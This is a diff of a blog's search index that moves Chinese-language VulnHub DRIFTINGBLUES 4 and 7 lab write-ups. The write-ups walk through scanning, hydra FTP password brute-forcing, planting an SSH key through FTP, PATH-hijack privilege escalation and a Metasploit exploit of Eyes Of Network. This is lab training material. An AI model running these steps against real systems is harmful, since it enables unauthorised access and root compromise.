@@ -1,137 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>q</title>
-    <url>/2024/05/01/q/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>VulnHub--DRIFTINGBLUES: 7</title>
-    <url>/2024/05/01/blues-7%EF%BC%88DRIFTINGBLUES%207)/</url>
-    <content><![CDATA[<h1 id="VulnHub–DRIFTINGBLUES-7"><a href="#VulnHub–DRIFTINGBLUES-7" class="headerlink" title="VulnHub–DRIFTINGBLUES: 7"></a>VulnHub–DRIFTINGBLUES: 7</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410120356895.png" alt="image-20240410120356895"></p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>nmap 192.168.217.148</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410120450608.png" alt="image-20240410120450608"></p>
-<p>开放的端口不少啊，进行详细扫描<code>nmap -A -sV -T4 -p- 192.168.217.148</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410121126207.png" alt="image-20240410121126207"></p>
-<p>22—ssh—OpenSSH 7.4 (protocol 2.0)</p>
-<p>66—http—SimpleHTTPServer 0.6 (Python 2.7.5)</p>
-<p>80—http—Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips</p>
-<p>111—rpcbind—2-4 (RPC #100000)</p>
-<p>443—ssl&#x2F;http—Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips</p>
-<p>2403—taskmaster2000?</p>
-<p>3306—mysql—MariaDB (unauthorized)</p>
-<p>8086—http—InfluxDB http admin 1.7.9</p>
-<h3 id="端口分析"><a href="#端口分析" class="headerlink" title="端口分析"></a>端口分析</h3><h4 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h4><p>一般只用来进行暴力破解</p>
-<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410122614540.png" alt="image-20240410122614540"></p>
-<p>扫描目录发现一个<code>bower.json</code>文件</p>
-<p><code>dirsearch -u 192.168.217.148   -x 403,302 --random-agent</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410153442365.png" alt="image-20240410153442365"></p>
-<p>发现Eyes Of Network版本5.3</p>
-<p>使用kali搜索一下漏洞库看看有没有漏洞可以利用</p>
-<p><code>searchsploit Eyes Of Network 5.3</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410153926081.png" alt="image-20240410153926081"></p>
-<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开美少妇（msf）搜索关键词Eyes Of Network</p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410154408703.png" alt="image-20240410154408703"></p>
-<p>查看需要配置的参数<code>show options</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410154952730.png" alt="image-20240410154952730"></p>
-<p>配置参数：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOST 192.168.217.148   目标IP</span><br><span class="line">set LHOST 192.168.217.129   监听地址</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410155517028.png" alt="image-20240410155517028">配置后的参数<img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410155501137.png" alt="image-20240410155501137"></p>
-<p>配置完成就可以直接进行攻击<code>run</code>或者<code>exploit</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410155751044.png" alt="image-20240410155751044"></p>
-<p>进入shell模式cd到root目录查看flag.txt</p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410160313075.png" alt="image-20240410160313075"></p>
-]]></content>
-      <categories>
-        <category>靶场，DRIFTINGBLUES系列，渗透笔记</category>
-      </categories>
-      <tags>
-        <tag>靶场，DRIFTINGBLUES系列，渗透笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blues-4</title>
-    <url>/2024/04/08/blues-4%EF%BC%88DRIFTINGBLUES%204)/</url>
-    <content><![CDATA[<h1 id="blues-4"><a href="#blues-4" class="headerlink" title="blues-4"></a>blues-4</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408213800927.png" alt="image-20240408213800927"></p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.217.145</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408214008037.png" alt="image-20240408214008037"></p>
-<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.217.145 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408214443678.png" alt="image-20240408214443678"></p>
-<p>啥也没有</p>
-<h3 id="80端口探查"><a href="#80端口探查" class="headerlink" title="80端口探查"></a>80端口探查</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408214546591.png" alt="image-20240408214546591"></p>
-<p>也是啥也没有</p>
-<h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408215040055.png" alt="image-20240408215040055"></p>
-<p>发现一段base64</p>
-<p>进行编译</p>
-<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;编译内容&quot; |base64 -d</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408215719193.png" alt="image-20240408215719193"></p>
-<p>经过多次编译得到一个文件，进行查看</p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408220003198.png" alt="image-20240408220003198"></p>
-<p>这应该是brainfuck编码，通过在线网站进行编译</p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408220954010.png" alt="image-20240408220954010"></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408221103202.png" alt="image-20240408221103202"></p>
-<p>发现了一个图片文件，打开发现是一个二维码。使用在线二维码识别网站识别该二维码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://uutool.cn/qrcode-decode/#:~:text=%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%EF%BC%8C,%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E3%80%82</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408222740596.png" alt="image-20240408222740596"></p>
-<p>发现又是一个图片文件，查看后发现是</p>
-<img src="https://raw.githubusercontent.com/coolajui/pictures/main/image.png"  />
-
-<p>文件内容可能是用户名，将它们组成词典，破解一下FTP（21 端口：FTP（File Transfer Protocol）数据传输端口，用于在计算机之间传输文件。）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure>
-
-<p>组成字典blues-4进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L blues-4 -P /uer/share/wordlists/rockyou.txt  ftp://192.168.217.145</span><br><span class="line">	-L用户名字典指定</span><br><span class="line">    -P密码字典指定</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409130819083.png" alt="image-20240409130819083"></p>
-<p>得到一组用户名和密码，用它登录FTP</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">mypics</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.217.145</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409140627386.png" alt="image-20240409140627386"></p>
-<p>除了发现目录hubert是可读可写的其他并没有发现什么，突然发现<code>hubert</code>的uid与其他不一样是<code>1001</code>，这可能是一个用户文件夹，也许可以设法将公钥上传至靶机，可以在本地生成公钥私钥，然后将公钥上传到目标主机的hubert目录下</p>
-<h2 id="本地生成ssh公私钥上传getshell"><a href="#本地生成ssh公私钥上传getshell" class="headerlink" title="本地生成ssh公私钥上传getshell"></a>本地生成ssh公私钥上传getshell</h2><p>kali生成密钥<code>ssh-keygen</code>&#x2F;将SSH 公钥文件存为<code> authorized_keys</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409142616496.png" alt="image-20240409142616496"></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409142741556.png" alt="image-20240409142741556"></p>
-<p>主要需要将公钥名称修改为authorized_keys，否则就不能认证通过，这应该与靶机上sshd_config的配置有关，通过ftp上传该公钥，首先需要在靶机上建立.ssh目录,然后使用 ftp 上传 <code>authorized_keys </code>到靶机里</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.9.26</span><br><span class="line">输入账户：luther</span><br><span class="line">输入密码：mypics</span><br><span class="line">cd hubert</span><br><span class="line">mkdir .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409143634407.png" alt="image-20240409143634407"></p>
-<p>修改 SSH 私钥为只读权限：<code>chmod 400 authorized_keys</code></p>
-<p>进行ssh远程连接<code>ssh hubert@192.168.217.145 -i authorized_keys</code></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409150143339.png" alt="image-20240409150143339"></p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409150251628.png" alt="image-20240409150251628"></p>
-<p>成功拿到第一个flag</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 suid 程序与命令劫持提权</p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409193612120.png" alt="image-20240409193612120"></p>
-<p>在<code>https://gtfobins.github.io/</code>未发现可利用的</p>
-<p>但发现了一个不常见的程序<code>/usr/bin/getinfo</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hubert@driftingblues:~$ /usr/bin/getinfo</span><br><span class="line">###################</span><br><span class="line">ip address</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 08:00:27:f3:c5:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.9.26/24 brd 192.168.9.255 scope global dynamic enp0s3</span><br><span class="line">       valid_lft 554sec preferred_lft 554sec</span><br><span class="line">    inet6 fe80::a00:27ff:fef3:c502/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">###################</span><br><span class="line">hosts</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       driftingblues</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">###################</span><br><span class="line">os info</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
-
-<p>根据上面输出的结果，可以推测这个程序中执行了 <code>ip addr</code>,<code> cat /etc/hosts</code>, <code>uname -a</code><br>因此，在这种情况下，我们可以在环境变量 PATH 中提供一个目录 (&#x2F;tmp)，并创建一个 ip或者 cat 文件，用于劫持命令，执行我们自定义的二进制文件就可以提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; ip</span><br><span class="line">chmod +x ip</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409193853082.png" alt="image-20240409193853082"></p>
-<p>成功提权，并在root目录下找到第二个flag</p>
-<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409193954315.png" alt="image-20240409193954315"></p>
-]]></content>
-      <categories>
-        <category>靶场，DRIFTINGBLUES系列，笔记</category>
-      </categories>
-      <tags>
-        <tag>靶场，DRIFTINGBLUES系列，笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网络安全题库</title>
     <url>/2024/04/02/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BA%93/</url>
     <content><![CDATA[<p>以下文章皆来源于网络，侵权删</p>
@@ -1223,6 +1092,201 @@
       <tags>
         <tag>网络安全，护网</tag>
         <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blues-4</title>
+    <url>/2024/04/08/blues-4%EF%BC%88DRIFTINGBLUES%204)/</url>
+    <content><![CDATA[<h1 id="blues-4"><a href="#blues-4" class="headerlink" title="blues-4"></a>blues-4</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408213800927.png" alt="image-20240408213800927"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.217.145</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408214008037.png" alt="image-20240408214008037"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.217.145 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408214443678.png" alt="image-20240408214443678"></p>
+<p>啥也没有</p>
+<h3 id="80端口探查"><a href="#80端口探查" class="headerlink" title="80端口探查"></a>80端口探查</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408214546591.png" alt="image-20240408214546591"></p>
+<p>也是啥也没有</p>
+<h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408215040055.png" alt="image-20240408215040055"></p>
+<p>发现一段base64</p>
+<p>进行编译</p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;编译内容&quot; |base64 -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408215719193.png" alt="image-20240408215719193"></p>
+<p>经过多次编译得到一个文件，进行查看</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408220003198.png" alt="image-20240408220003198"></p>
+<p>这应该是brainfuck编码，通过在线网站进行编译</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408220954010.png" alt="image-20240408220954010"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408221103202.png" alt="image-20240408221103202"></p>
+<p>发现了一个图片文件，打开发现是一个二维码。使用在线二维码识别网站识别该二维码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://uutool.cn/qrcode-decode/#:~:text=%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%EF%BC%8C,%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E3%80%82</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240408222740596.png" alt="image-20240408222740596"></p>
+<p>发现又是一个图片文件，查看后发现是</p>
+<img src="https://raw.githubusercontent.com/coolajui/pictures/main/image.png"  />
+
+<p>文件内容可能是用户名，将它们组成词典，破解一下FTP（21 端口：FTP（File Transfer Protocol）数据传输端口，用于在计算机之间传输文件。）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure>
+
+<p>组成字典blues-4进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L blues-4 -P /uer/share/wordlists/rockyou.txt  ftp://192.168.217.145</span><br><span class="line">	-L用户名字典指定</span><br><span class="line">    -P密码字典指定</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409130819083.png" alt="image-20240409130819083"></p>
+<p>得到一组用户名和密码，用它登录FTP</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">mypics</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.217.145</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409140627386.png" alt="image-20240409140627386"></p>
+<p>除了发现目录hubert是可读可写的其他并没有发现什么，突然发现<code>hubert</code>的uid与其他不一样是<code>1001</code>，这可能是一个用户文件夹，也许可以设法将公钥上传至靶机，可以在本地生成公钥私钥，然后将公钥上传到目标主机的hubert目录下</p>
+<h2 id="本地生成ssh公私钥上传getshell"><a href="#本地生成ssh公私钥上传getshell" class="headerlink" title="本地生成ssh公私钥上传getshell"></a>本地生成ssh公私钥上传getshell</h2><p>kali生成密钥<code>ssh-keygen</code>&#x2F;将SSH 公钥文件存为<code> authorized_keys</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409142616496.png" alt="image-20240409142616496"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409142741556.png" alt="image-20240409142741556"></p>
+<p>主要需要将公钥名称修改为authorized_keys，否则就不能认证通过，这应该与靶机上sshd_config的配置有关，通过ftp上传该公钥，首先需要在靶机上建立.ssh目录,然后使用 ftp 上传 <code>authorized_keys </code>到靶机里</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.9.26</span><br><span class="line">输入账户：luther</span><br><span class="line">输入密码：mypics</span><br><span class="line">cd hubert</span><br><span class="line">mkdir .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409143634407.png" alt="image-20240409143634407"></p>
+<p>修改 SSH 私钥为只读权限：<code>chmod 400 authorized_keys</code></p>
+<p>进行ssh远程连接<code>ssh hubert@192.168.217.145 -i authorized_keys</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409150143339.png" alt="image-20240409150143339"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409150251628.png" alt="image-20240409150251628"></p>
+<p>成功拿到第一个flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 suid 程序与命令劫持提权</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409193612120.png" alt="image-20240409193612120"></p>
+<p>在<code>https://gtfobins.github.io/</code>未发现可利用的</p>
+<p>但发现了一个不常见的程序<code>/usr/bin/getinfo</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hubert@driftingblues:~$ /usr/bin/getinfo</span><br><span class="line">###################</span><br><span class="line">ip address</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 08:00:27:f3:c5:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.9.26/24 brd 192.168.9.255 scope global dynamic enp0s3</span><br><span class="line">       valid_lft 554sec preferred_lft 554sec</span><br><span class="line">    inet6 fe80::a00:27ff:fef3:c502/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">###################</span><br><span class="line">hosts</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       driftingblues</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">###################</span><br><span class="line">os info</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<p>根据上面输出的结果，可以推测这个程序中执行了 <code>ip addr</code>,<code> cat /etc/hosts</code>, <code>uname -a</code><br>因此，在这种情况下，我们可以在环境变量 PATH 中提供一个目录 (&#x2F;tmp)，并创建一个 ip或者 cat 文件，用于劫持命令，执行我们自定义的二进制文件就可以提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; ip</span><br><span class="line">chmod +x ip</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409193853082.png" alt="image-20240409193853082"></p>
+<p>成功提权，并在root目录下找到第二个flag</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409193954315.png" alt="image-20240409193954315"></p>
+]]></content>
+      <categories>
+        <category>靶场，DRIFTINGBLUES系列，笔记</category>
+      </categories>
+      <tags>
+        <tag>靶场，DRIFTINGBLUES系列，笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub--DRIFTINGBLUES: 7</title>
+    <url>/2024/05/01/blues-7%EF%BC%88DRIFTINGBLUES%207)/</url>
+    <content><![CDATA[<h1 id="VulnHub–DRIFTINGBLUES-7"><a href="#VulnHub–DRIFTINGBLUES-7" class="headerlink" title="VulnHub–DRIFTINGBLUES: 7"></a>VulnHub–DRIFTINGBLUES: 7</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410120356895.png" alt="image-20240410120356895"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>nmap 192.168.217.148</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410120450608.png" alt="image-20240410120450608"></p>
+<p>开放的端口不少啊，进行详细扫描<code>nmap -A -sV -T4 -p- 192.168.217.148</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410121126207.png" alt="image-20240410121126207"></p>
+<p>22—ssh—OpenSSH 7.4 (protocol 2.0)</p>
+<p>66—http—SimpleHTTPServer 0.6 (Python 2.7.5)</p>
+<p>80—http—Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips</p>
+<p>111—rpcbind—2-4 (RPC #100000)</p>
+<p>443—ssl&#x2F;http—Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips</p>
+<p>2403—taskmaster2000?</p>
+<p>3306—mysql—MariaDB (unauthorized)</p>
+<p>8086—http—InfluxDB http admin 1.7.9</p>
+<h3 id="端口分析"><a href="#端口分析" class="headerlink" title="端口分析"></a>端口分析</h3><h4 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h4><p>一般只用来进行暴力破解</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410122614540.png" alt="image-20240410122614540"></p>
+<p>扫描目录发现一个<code>bower.json</code>文件</p>
+<p><code>dirsearch -u 192.168.217.148   -x 403,302 --random-agent</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410153442365.png" alt="image-20240410153442365"></p>
+<p>发现Eyes Of Network版本5.3</p>
+<p>使用kali搜索一下漏洞库看看有没有漏洞可以利用</p>
+<p><code>searchsploit Eyes Of Network 5.3</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410153926081.png" alt="image-20240410153926081"></p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开美少妇（msf）搜索关键词Eyes Of Network</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410154408703.png" alt="image-20240410154408703"></p>
+<p>查看需要配置的参数<code>show options</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410154952730.png" alt="image-20240410154952730"></p>
+<p>配置参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOST 192.168.217.148   目标IP</span><br><span class="line">set LHOST 192.168.217.129   监听地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410155517028.png" alt="image-20240410155517028">配置后的参数<img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410155501137.png" alt="image-20240410155501137"></p>
+<p>配置完成就可以直接进行攻击<code>run</code>或者<code>exploit</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410155751044.png" alt="image-20240410155751044"></p>
+<p>进入shell模式cd到root目录查看flag.txt</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240410160313075.png" alt="image-20240410160313075"></p>
+]]></content>
+      <categories>
+        <category>靶场，DRIFTINGBLUES系列，渗透笔记</category>
+      </categories>
+      <tags>
+        <tag>靶场，DRIFTINGBLUES系列，渗透笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub-DRIFTINGBLUES: 5</title>
+    <url>/2024/04/09/blues-5%EF%BC%88DRIFTINGBLUES%205)/</url>
